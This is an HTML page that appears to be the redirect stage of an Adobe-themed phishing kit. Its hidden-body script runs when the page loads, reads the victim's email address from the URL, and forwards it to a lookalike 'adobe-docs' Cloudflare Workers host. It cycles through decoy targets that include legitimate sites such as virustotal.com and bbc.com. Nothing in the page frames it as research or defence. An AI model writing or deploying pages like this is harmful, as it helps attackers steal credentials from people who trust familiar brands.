<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // List of target sites
    const sites = [
      "https://adobecloud-document-874ba.adobe-docs.workers.dev",
      "https://total.com",
      "https://adobe.com",
      "https://bbc.com",
      "https://virustotal.com"
    ];

    let current = 0;

    // Function to get ?email= from query string
    function getEmail() {
      const params = new URLSearchParams(window.location.search);
      return params.get("email") || "";
    }

    function redirectLoop() {
      const target = sites[current]; // pick current site
      const email = getEmail();

      // Build Worker URL with target + email
      let url = "https://officepdf-cloudsign-electronic.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
      if (email) {
        url += "&email=" + encodeURIComponent(email);
      }

      // Redirect immediately
      window.location.replace(url);

      // Move to next site for next visit (round-robin)
      current = (current + 1) % sites.length;
    }

    // Trigger redirect when page loads
    window.addEventListener("load", redirectLoop);
  </script>
</head>
<body style="display:none;">
  Redirecting...
</body>
</html>
